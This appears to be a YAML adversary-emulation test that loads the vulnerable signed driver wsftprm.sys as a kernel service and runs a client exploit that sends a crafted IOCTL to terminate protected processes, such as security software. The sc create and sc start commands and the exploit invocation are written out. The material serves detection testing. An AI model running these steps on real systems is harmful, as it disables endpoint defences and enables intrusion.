description: |
  This procedure exploits a known vulnerability in a legitimate, signed driver (wsftprm.sys) 
  to gain kernel-level privileges. An attacker first loads the vulnerable driver by creating 
  a temporary kernel service. Then, a user-mode client application sends a specially crafted 
  IOCTL command to the driver, instructing it to terminate a specified process. This is often 
  used to disable security software that is protected from user-mode termination.
execution:
  executor: powershell
  command: |
    sc create #{service_name} type= kernel binPath= "#{driver_path}"
    sc start #{service_name}
    "#{client_executable_path}" "#{target_process_name}"
arguments:
  service_name:
    Default: 'VulnerableSvc'
    Required: true
    Description: A temporary name for the kernel service used to load the driver.
  driver_path:
    Default: C:\Windows\Temp\wsftprm.sys
    Required: true
    Description: The path where the vulnerable driver file will be placed on the target system.
  client_executable_path:
    Default: C:\Windows\Temp\exploit.exe
    Required: true
    Description: The path to the user-mode application that sends the malicious IOCTL.
  target_process_name:
    Default: 'Notepad.exe'
    Required: true
    Description: The name of the protected process to be terminated by the exploit.
